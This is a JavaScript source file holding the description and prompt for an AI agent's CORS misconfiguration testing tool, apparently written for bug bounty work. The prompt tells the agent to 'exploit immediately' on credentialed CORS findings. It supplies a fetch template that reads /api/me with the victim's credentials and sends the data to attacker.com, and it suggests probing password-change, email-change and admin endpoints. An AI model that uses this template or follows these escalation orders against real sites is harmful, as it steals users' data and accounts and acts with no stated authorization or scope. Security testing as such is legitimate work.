import { CORS_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `CORS misconfiguration tester — tests origins, credentials, preflight, and wildcard with auth.`

export const PROMPT = `## ${CORS_TOOL_NAME} — CORS Misconfiguration Testing

### ESCALATION RULE — Only critical CORS (ACAC: true) is worth pursuing:
- **info/medium (wildcard without credentials)**: log and move on — attacker cannot read responses without victim credentials
- **critical (ACAO reflects origin + ACAC: true)**: ESCALATE immediately → ChainTool bug_class=cors-credentialed for exploitation technique
  - Craft a page that makes credentialed fetch to /api/me, /api/keys, /api/tokens — exfiltrate to attacker endpoint
  - Test sensitive mutations: POST /api/password/change, PUT /api/email, POST /api/admin/*
  - Code template: fetch('https://target.com/api/me', {credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/'+btoa(JSON.stringify(d))))

### Actions
- \`test\` — send preflight + actual request with arbitrary Origin, check ACAO/ACAC headers
- \`scan\` — test multiple bypass patterns against a target

### Severity
- **critical**: ACAO reflects origin AND ACAC: true (credentialed cross-origin reads) — exploit immediately
- **high**: ACAO reflects origin without ACAC:true, or ACAO: null — limited impact
- **medium**: wildcard with credentials (invalid per spec, no real-world impact)
- **info**: no bypass found

### Examples
- Single test: \`{ url: "https://target.com/api", origin: "https://evil.com", action: "test" }\`
- Full scan: \`{ url: "https://target.com/api", action: "scan" }\`
`
